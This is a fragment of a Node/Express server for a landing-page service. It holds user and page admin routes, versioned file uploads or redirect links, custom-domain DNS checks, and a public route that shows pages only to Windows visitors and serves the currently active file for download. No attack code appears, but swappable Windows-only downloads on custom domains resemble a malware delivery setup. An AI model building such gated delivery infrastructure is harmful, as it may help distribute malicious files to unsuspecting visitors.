      [updates.name, updates.email, hash, updates.role, updates.status, req.params.id]);
  } else {
    await runSql('UPDATE users SET name=?, email=?, role=?, status=? WHERE id=?',
      [updates.name, updates.email, updates.role, updates.status, req.params.id]);
  }
  logActivity('User Updated', 'Updated user: ' + updates.name, req.session.user.name);
  res.json({ ...updates, id: req.params.id });
});

app.delete('/api/users/:id', requireAdmin, async (req, res) => {
  const user = await queryOne('SELECT name FROM users WHERE id = ?', [req.params.id]);
  if (!user) return res.status(404).json({ error: 'User not found' });
  if (req.params.id === req.session.user.id) return res.status(400).json({ error: 'Cannot delete yourself' });

  await runSql('DELETE FROM users WHERE id = ?', [req.params.id]);
  logActivity('User Deleted', 'Deleted user: ' + user.name, req.session.user.name);
  res.json({ ok: true });
});

// ═══════════ PAGES (Admin) ═══════════
app.get('/api/pages', requireAuth, async (req, res) => {
  const pages = await queryAll('SELECT * FROM pages ORDER BY created DESC');
  for (const p of pages) {
    p.versions = await queryAll('SELECT * FROM versions WHERE page_id = ? ORDER BY date DESC', [p.id]);
  }
  res.json(pages);
});

app.post('/api/pages', requireAdmin, async (req, res) => {
  const { name, htmlCode, status } = req.body;
  if (!name) return res.status(400).json({ error: 'Page name required' });

  const id = uid();
  await runSql('INSERT INTO pages (id, name, html_code, status, created) VALUES (?, ?, ?, ?, ?)',
    [id, name, htmlCode || '', status || 'active', today()]
  );
  logActivity('Page Created', 'Created page: ' + name, req.session.user.name);
  res.json({ id, name, html_code: htmlCode || '', status: status || 'active', created: today(), versions: [] });
});

app.put('/api/pages/:id', requireAdmin, async (req, res) => {
  const { name, htmlCode, status } = req.body;
  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });

  await runSql('UPDATE pages SET name=?, html_code=?, status=? WHERE id=?',
    [name || page.name, htmlCode !== undefined ? htmlCode : page.html_code, status || page.status, req.params.id]
  );
  logActivity('Page Updated', 'Updated page: ' + (name || page.name), req.session.user.name);
  res.json({ ok: true });
});

app.delete('/api/pages/:id', requireAdmin, async (req, res) => {
  const page = await queryOne('SELECT name FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });

  const versions = await queryAll('SELECT file_path FROM versions WHERE page_id = ?', [req.params.id]);
  versions.forEach(v => {
    if (v.file_path) {
      const fp = path.join(uploadsDir, v.file_path);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    }
  });

  await runSql('DELETE FROM versions WHERE page_id = ?', [req.params.id]);
  await runSql('DELETE FROM pages WHERE id = ?', [req.params.id]);
  logActivity('Page Deleted', 'Deleted page: ' + page.name, req.session.user.name);
  res.json({ ok: true });
});

// ═══════════ VERSIONS / FILE UPLOAD (User) ═══════════
app.post('/api/pages/:id/upload', requireAuth, upload.single('file'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });

  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });

  // Auto-increment version
  const latest = await queryOne('SELECT version FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [req.params.id]);
  let newVer = '0.0.1';
  if (latest && latest.version) {
    const parts = latest.version.split('.');
    const patch = (parseInt(parts[2]) || 0) + 1;
    newVer = (parts[0] || '0') + '.' + (parts[1] || '0') + '.' + patch;
  }

  // Deactivate all existing versions
  await runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [req.params.id]);

  const vId = uid();
  await runSql('INSERT INTO versions (id, page_id, version, file_name, file_path, original_name, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)',
    [vId, req.params.id, newVer, req.file.filename, req.file.filename, req.file.originalname, 'Uploaded on ' + today(), today()]
  );

  logActivity('File Uploaded', 'Uploaded v' + newVer + ' for ' + page.name, req.session.user.name);
  res.json({ id: vId, version: newVer, fileName: req.file.originalname, active: true });
});

app.post('/api/pages/:id/link', requireAuth, async (req, res) => {
  const { linkUrl, notes } = req.body;
  if (!linkUrl) return res.status(400).json({ error: 'Link URL is required' });

  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });

  // Auto-increment version
  const latest = await queryOne('SELECT version FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [req.params.id]);
  let newVer = '0.0.1';
  if (latest && latest.version) {
    const parts = latest.version.split('.');
    const patch = (parseInt(parts[2]) || 0) + 1;
    newVer = (parts[0] || '0') + '.' + (parts[1] || '0') + '.' + patch;
  }

  // Deactivate all existing versions
  await runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [req.params.id]);

  const vId = uid();
  await runSql('INSERT INTO versions (id, page_id, version, file_name, file_path, original_name, link_url, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
    [vId, req.params.id, newVer, null, null, null, linkUrl, notes || 'Link added on ' + today(), today()]
  );

  logActivity('Link Added', 'Added link v' + newVer + ' for ' + page.name, req.session.user.name);
  res.json({ id: vId, version: newVer, linkUrl, active: true });
});

app.put('/api/versions/:id/activate', requireAuth, async (req, res) => {
  const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
  if (!ver) return res.status(404).json({ error: 'Version not found' });

  await runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [ver.page_id]);
  await runSql('UPDATE versions SET active = 1 WHERE id = ?', [req.params.id]);
  res.json({ ok: true });
});

app.delete('/api/versions/:id', requireAuth, async (req, res) => {
  const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
  if (!ver) return res.status(404).json({ error: 'Version not found' });

  const rows = await queryAll('SELECT id FROM versions WHERE page_id = ?', [ver.page_id]);
  if (rows.length <= 1) return res.status(400).json({ error: 'Cannot delete the only version' });

  if (ver.file_path) {
    const fp = path.join(uploadsDir, ver.file_path);
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
  }

  const wasActive = ver.active;
  await runSql('DELETE FROM versions WHERE id = ?', [req.params.id]);

  if (wasActive) {
    const next = await queryOne('SELECT id FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [ver.page_id]);
    if (next) await runSql('UPDATE versions SET active = 1 WHERE id = ?', [next.id]);
  }

  res.json({ ok: true });
});

// ═══════════ DNS CONFIG ═══════════
app.get('/api/dns-config', requireAuth, async (req, res) => {
  let serverIp = process.env.SERVER_IP || '';
  let serverHostname = process.env.SERVER_HOSTNAME || '';
  // Fallback to settings table
  if (!serverIp) {
    const row = await queryOne("SELECT value FROM settings WHERE key = 'server_ip'");
    if (row) serverIp = row.value;
  }
  if (!serverHostname) {
    const row = await queryOne("SELECT value FROM settings WHERE key = 'server_hostname'");
    if (row) serverHostname = row.value;
  }
  const dnsType = serverIp ? 'A' : (serverHostname ? 'CNAME' : 'A');
  const dnsValue = serverIp || serverHostname || '';
  res.json({ serverIp, serverHostname, dnsType, dnsValue });
});

// ═══════════ DOMAINS (User) ═══════════
app.get('/api/domains', requireAuth, async (req, res) => {
  const domains = await queryAll('SELECT * FROM domains WHERE user_id = ? ORDER BY created DESC', [req.session.user.id]);
  res.json(domains);
});

app.post('/api/domains', requireAuth, async (req, res) => {
  const { domain, pageId, autoSSL, notes } = req.body;
  if (!domain) return res.status(400).json({ error: 'Domain name required' });

  // Auto-fill DNS config from server settings
  let serverIp = process.env.SERVER_IP || '';
  let serverHostname = process.env.SERVER_HOSTNAME || '';
  if (!serverIp) { const r = await queryOne("SELECT value FROM settings WHERE key = 'server_ip'"); if (r) serverIp = r.value; }
  if (!serverHostname) { const r = await queryOne("SELECT value FROM settings WHERE key = 'server_hostname'"); if (r) serverHostname = r.value; }
  const dnsType = serverIp ? 'A' : (serverHostname ? 'CNAME' : 'A');
  const dnsValue = serverIp || serverHostname || '';

  const id = uid();
  await runSql('INSERT INTO domains (id, user_id, domain, page_id, dns_type, dns_value, auto_ssl, ssl_active, dns_verified, notes, created) VALUES (?, ?, ?, ?, ?, ?, ?, 0, 0, ?, ?)',
    [id, req.session.user.id, domain, pageId || null, dnsType, dnsValue, autoSSL !== false ? 1 : 0, notes || '', today()]
  );
  logActivity('Domain Added', 'Added domain: ' + domain, req.session.user.name);
  res.json({ id, domain, page_id: pageId, dns_type: dnsType, dns_value: dnsValue, auto_ssl: autoSSL !== false ? 1 : 0, ssl_active: 0, dns_verified: 0, notes: notes || '', created: today() });
});

app.put('/api/domains/:id', requireAuth, async (req, res) => {
  const dom = await queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
  if (!dom) return res.status(404).json({ error: 'Domain not found' });

  const { domain, pageId, dnsType, dnsValue, autoSSL, notes } = req.body;
  await runSql('UPDATE domains SET domain=?, page_id=?, dns_type=?, dns_value=?, auto_ssl=?, notes=? WHERE id=?',
    [domain || dom.domain, pageId !== undefined ? pageId : dom.page_id, dnsType || dom.dns_type,
     dnsValue !== undefined ? dnsValue : dom.dns_value, autoSSL !== undefined ? (autoSSL ? 1 : 0) : dom.auto_ssl,
     notes !== undefined ? notes : dom.notes, req.params.id]
  );
  res.json({ ok: true });
});

app.delete('/api/domains/:id', requireAuth, async (req, res) => {
  const dom = await queryOne('SELECT domain FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
  if (!dom) return res.status(404).json({ error: 'Domain not found' });

  await runSql('DELETE FROM domains WHERE id = ?', [req.params.id]);
  logActivity('Domain Deleted', 'Deleted domain: ' + dom.domain, req.session.user.name);
  res.json({ ok: true });
});

app.post('/api/domains/:id/verify-dns', requireAuth, async (req, res) => {
  const dom = await queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
  if (!dom) return res.status(404).json({ error: 'Domain not found' });

  const expected = dom.dns_value;
  if (!expected) return res.status(400).json({ error: 'No DNS target configured. Set SERVER_IP or SERVER_HOSTNAME in settings.' });

  try {
    let current = [];
    if (dom.dns_type === 'A') {
      current = await dns.resolve4(dom.domain);
    } else {
      current = await dns.resolveCname(dom.domain);
    }
    const verified = current.includes(expected);
    if (verified) {
      await runSql('UPDATE domains SET dns_verified = 1 WHERE id = ?', [req.params.id]);
    }
    res.json({ verified, current: current.join(', '), expected });
  } catch (err) {
    res.json({ verified: false, current: 'DNS lookup failed: ' + (err.code || err.message), expected });
  }
});

app.post('/api/domains/:id/ssl', requireAuth, async (req, res) => {
  const dom = await queryOne('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.user.id]);
  if (!dom) return res.status(404).json({ error: 'Domain not found' });

  if (!dom.dns_verified) return res.status(400).json({ error: 'DNS must be verified before installing SSL. Please verify DNS propagation first.' });

  const { action } = req.body;
  if (action === 'generate' || action === 'renew') {
    await runSql('UPDATE domains SET ssl_active = 1, ssl_date = ? WHERE id = ?', [today(), req.params.id]);
    logActivity('SSL ' + (action === 'generate' ? 'Generated' : 'Renewed'), dom.domain, req.session.user.name);
  }
  res.json({ ok: true });
});

// ═══════════ LINKS (User) ═══════════
app.get('/api/links', requireAuth, async (req, res) => {
  const links = await queryAll(
    'SELECT d.*, p.name as page_name FROM domains d LEFT JOIN pages p ON d.page_id = p.id WHERE d.user_id = ? ORDER BY d.created DESC',
    [req.session.user.id]
  );
  const results = links.map(d => {
    const protocol = d.ssl_active ? 'https' : 'http';
    let status = 'no_page';
    if (d.page_id && d.page_name) {
      status = d.ssl_active ? 'ready' : 'http_only';
    }
    return {
      id: d.id,
      domain: d.domain,
      page_id: d.page_id,
      page_name: d.page_name || null,
      link: protocol + '://' + d.domain,
      fallback_link: d.page_id ? '/page/' + d.page_id : null,
      ssl_active: d.ssl_active,
      dns_type: d.dns_type,
      dns_value: d.dns_value,
      status: status,
      created: d.created
    };
  });
  res.json(results);
});

// ═══════════ ACTIVITY & SETTINGS (Admin) ═══════════
app.get('/api/activity', requireAdmin, async (req, res) => {
  const items = await queryAll('SELECT * FROM activity ORDER BY id DESC LIMIT 50');
  res.json(items);
});

app.get('/api/settings', requireAdmin, async (req, res) => {
  const rows = await queryAll('SELECT * FROM settings');
  const obj = {};
  rows.forEach(r => { obj[r.key] = r.value; });
  res.json(obj);
});

app.put('/api/settings', requireAdmin, async (req, res) => {
  for (const [k, v] of Object.entries(req.body)) {
    const existing = await queryOne('SELECT key FROM settings WHERE key = ?', [k]);
    if (existing) {
      await runSql('UPDATE settings SET value = ? WHERE key = ?', [v, k]);
    } else {
      await runSql('INSERT INTO settings (key, value) VALUES (?, ?)', [k, v]);
    }
  }
  res.json({ ok: true });
});

// ═══════════ STATS ═══════════
app.get('/api/stats', requireAuth, async (req, res) => {
  const user = req.session.user;
  if (user.role === 'Admin') {
    const pages = await queryOne('SELECT COUNT(*) as c FROM pages');
    const users = await queryOne('SELECT COUNT(*) as c FROM users');
    const versions = await queryOne('SELECT COUNT(*) as c FROM versions');
    const domains = await queryOne('SELECT COUNT(*) as c FROM domains');
    res.json({ pages: pages.c, users: users.c, versions: versions.c, domains: domains.c });
  } else {
    const pages = await queryOne('SELECT COUNT(*) as c FROM pages');
    const versions = await queryOne('SELECT COUNT(*) as c FROM versions');
    const domains = await queryOne('SELECT COUNT(*) as c FROM domains WHERE user_id = ?', [user.id]);
    const sslActive = await queryOne('SELECT COUNT(*) as c FROM domains WHERE user_id = ? AND ssl_active = 1', [user.id]);
    res.json({ pages: pages.c, versions: versions.c, domains: domains.c, sslActive: sslActive.c });
  }
});

// ═══════════ PUBLIC PAGE RENDERING ═══════════
app.get('/page/:id', async (req, res) => {
  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
  if (!page || !page.html_code) {
    return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1 style="font-size:1.5rem;color:#fff;">Page Not Found</h1><p style="color:#64748b;">This landing page does not exist.</p></div></body></html>');
  }

  // Windows-only check
  if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());

  await renderPage(page, res);
});

app.get('/download/:pageId', async (req, res) => {
  const activeVersion = await queryOne('SELECT * FROM versions WHERE page_id = ? AND active = 1 LIMIT 1', [req.params.pageId]);
  if (!activeVersion) return res.status(404).json({ error: 'No active version' });

  // Link URL — redirect
  if (activeVersion.link_url) {
    return res.redirect(activeVersion.link_url);
  }

  // File download
  if (!activeVersion.file_path) return res.status(404).json({ error: 'No active file' });
  const filePath = path.join(uploadsDir, activeVersion.file_path);
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found on disk' });

  res.download(filePath, activeVersion.original_name || activeVersion.file_name);
});

// SPA fallback
app.get('*', (req, res) => {
  const indexPath = path.join(clientBuild, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.send('Run "cd client && npm run build" to build the React frontend.');
  }
});

// Start server after DB init
initDb().then(() => {
  app.listen(PORT, () => {
    console.log('SC Landing Pages server running on http://localhost:' + PORT);
  });
}).catch(err => {
  console.error('Failed to initialize database:', err);
  process.exit(1);
});
